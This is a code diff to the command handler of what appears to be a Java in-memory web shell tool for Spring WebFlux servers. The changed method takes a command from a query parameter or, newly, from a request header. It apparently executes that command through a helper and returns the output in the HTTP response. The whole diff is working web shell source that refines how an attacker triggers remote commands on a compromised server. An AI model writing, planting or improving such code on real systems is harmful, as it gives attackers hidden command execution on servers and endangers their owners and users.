@@ -3,9 +3,8 @@ package com.reajason.javaweb.memshell.shelltool.command;
 import org.springframework.http.ResponseEntity;
 import org.springframework.web.server.ServerWebExchange;
 
-import java.io.BufferedReader;
 import java.io.InputStream;
-import java.io.InputStreamReader;
+import java.util.Scanner;
 
 /**
  * @author ReaJason
@@ -15,23 +14,21 @@ public class CommandHandlerMethod {
     public static String paramName;
 
     public ResponseEntity<?> invoke(ServerWebExchange exchange) {
-        String param = getParam(exchange.getRequest().getQueryParams().getFirst(paramName));
-        StringBuilder result = new StringBuilder();
+        String p = exchange.getRequest().getQueryParams().getFirst(paramName);
+        if (p == null || p.isEmpty()) {
+            p = exchange.getRequest().getHeaders().getFirst(paramName);
+        }
+        String result = "";
         try {
-            if (param != null) {
+            if (p != null) {
+                String param = getParam(p);
                 InputStream inputStream = getInputStream(param);
-                try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream))) {
-                    String line;
-                    while ((line = bufferedReader.readLine()) != null) {
-                        result.append(line);
-                        result.append(System.lineSeparator());
-                    }
-                }
+                result = new Scanner(inputStream).useDelimiter("\\A").next();
             }
         } catch (Throwable e) {
             e.printStackTrace();
         }
-        return ResponseEntity.ok(result.toString());
+        return ResponseEntity.ok(result);
     }
 
     private String getParam(String param) {
